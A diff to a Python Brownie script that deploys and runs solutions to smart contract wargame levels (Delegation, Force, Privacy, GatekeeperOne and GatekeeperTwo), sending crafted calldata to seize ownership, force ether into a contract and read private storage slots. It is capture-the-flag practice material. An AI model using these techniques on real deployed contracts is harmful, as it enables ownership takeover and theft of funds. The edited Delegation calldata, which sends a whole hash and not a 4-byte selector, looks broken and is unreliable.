@@ -5,10 +5,12 @@ from brownie import AttackForce, Vault, King, AttackKing, Reentrance, AttackReen
 from brownie import Fallback, Fallout, CoinFlip, CoinFlipAttacker, Telephone, TelephoneAttacker, TokenThing, Delegation, Delegate, Force
 from brownie import NaughtCoin, Preservation, AttackPreservation, SimpleToken, MagicNum
 from brownie import Wei, AttackPrivacy, GatekeeperOne, AttackGatekeeperOne, GatekeeperTwo, AttackGatekeeperTwo
+from brownie import network, config, accounts, Contract
+
 from web3 import Web3
 
 from scripts.attackers import attack_fallback, attack_fallout, attack_token
-from scripts.interface import *
+from scripts.interface import get_account, deploy_contract, deploy_mocks, LOCAL_BLOCKCHAIN_ENVIRONMENTS, FORKED_LOCAL_ENVIRONMENTS
 
 
 def deploy_fallback():
@@ -94,13 +96,9 @@ def deploy_token():
 
 def deploy_delegation():
     account = get_account()
-
-    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
-        delegate = deploy_contract(Delegate, "delegate", 1, [accounts[1].address])
-
     delegation = deploy_contract(Delegation, "delegation", 1, [])
 
-    data_to_send = Web3.keccak(text="pwn()")[0:4].hex()
+    data_to_send = Web3.keccak(text="pwn()").hex()
     print(f"Before the attack...are we owner of delegation? {delegation.owner() == account.address}")
     account.transfer(delegation.address, amount="0 ether", data=data_to_send).wait(1)
     print(f"After the attack...are we owner of delegation? {delegation.owner() == account.address}")
@@ -109,9 +107,10 @@ def deploy_delegation():
 def deploy_force():
     account = get_account()
     force = deploy_contract(Force, "force", 1, [])
-    attackForce = AttackForce.deploy({"from": account}, publish_source=False)
-    attackForce.attack(force.address, {"from": account, "value": 1})
-    print("Force attacked! Try submitting the solution as complete.")
+
+    attack_force = AttackForce.deploy({"from": account, "value": 100000}, publish_source=False)
+    attack_force.attack(force.address, {"from": account})
+    print("Force attacked! Try submitting the solution as complete.", force.balance())
 
 
 def deploy_vault():
@@ -192,9 +191,10 @@ def deploy_privacy():
         print("Use forked!")
         return
 
-    w3 = Web3(Web3.HTTPProvider(f"https://rinkeby.infura.io/v3/{os.getenv('WEB3_INFURA_PROJECT_ID')}"))
+    w3 = Web3(Web3.HTTPProvider(f"https://goerli.infura.io/v3/{os.getenv('WEB3_INFURA_PROJECT_ID')}"))
 
     print(f"Connected? {w3.isConnected()}")
+    print(f"Privacy contract address: {privacy.address}")
     _dataArray = w3.eth.get_storage_at(privacy.address, 5)  # get 6th variable
 
     # let's see all the memory slots (variables) for sanity
@@ -213,19 +213,20 @@ def deploy_gatekeeper_one():
     account = get_account()
     # we use deploy_contract when it doesn't get deployed if an address is specified in the config
     gatekeeper_one = deploy_contract(GatekeeperOne, "GatekeeperOne", 1, [])
-
-    # we use Class.deploy when we always want to deploy a new contract
-    attacker = AttackGatekeeperOne.deploy(gatekeeper_one.address, {"from": account.address}, publish_source=False)
-    print(f"Before attack...entrant: {gatekeeper_one.entrant()}")
-    attacker.enter().wait(1)
-    print(f"After the attack...entrant: {gatekeeper_one.entrant()}")
+    accaddr = account.address
+    u16 = accaddr[-4:]
+    u32 = u16.zfill(8)
+    u64 = ("1" + u32).zfill(16)
+    att = AttackGatekeeperOne.deploy(gatekeeper_one.address, {"from": accounts[0].address,"gas":1000000,"priority_fee":"5 gwei"})
+    att.enter(u64)
 
 
 def deploy_gatekeeper_two():
     account = get_account()
     gatekeeper_two = deploy_contract(GatekeeperTwo, "GatekeeperTwo", 1, [])
     print(f"Before attack...entrant: {gatekeeper_two.entrant()}")
-    attacker = AttackGatekeeperTwo.deploy(gatekeeper_two.address, {"from": account.address}, publish_source=False)
+    attacker = AttackGatekeeperTwo.deploy(gatekeeper_two.address, {"from": account.address, "gas_limit": 1000000,
+                                          "gas_price": 100000, "allow_revert": True}, publish_source=False)
     print(f"After attack...entrant: {gatekeeper_two.entrant()}")
 
 
